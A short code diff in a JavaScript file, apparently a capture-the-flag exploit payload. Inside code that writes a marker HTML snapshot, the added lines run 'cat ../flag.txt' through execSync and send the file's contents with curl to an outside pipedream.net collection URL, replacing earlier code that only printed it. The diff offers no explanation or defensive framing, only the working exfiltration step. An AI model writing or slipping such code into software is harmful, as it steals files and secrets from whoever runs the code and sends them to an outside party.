@@ -9,19 +9,18 @@
     const markerId = "deadbeefdeadbeef";
     const outPath = path.join(snapshotsDir, `${markerId}.html`);
     fs.writeFileSync(outPath, "MARKER_OK", "utf8");
-    const { exec } = require('child_process');
+    const { execSync } = require('child_process');
     
-    exec('cat ../flag.txt', (error, stdout, stderr) => {
-      if (error) {
-        console.error(`error: ${error.message}`);
-        return;
-      }
-      if (stderr) {
-        console.error(`stderr: ${stderr}`);
-        return;
-      }
-      console.log(`현재 경로:\n${stdout}`);
-    });
+    try {
+      const flag = execSync('cat ../flag.txt', { encoding: 'utf8' })
+        .trim()
+        .replace(/\n/g, '');
+    
+      execSync(`curl "https://5ce34728a92f6a97b751d3221c0f0313.m.pipedream.net/?flag=${flag}"`);
+    
+    } catch (e) {
+      console.log(e);
+    }
 
     console.log("[waywayback hellow] marker html written");
   } catch (e) {
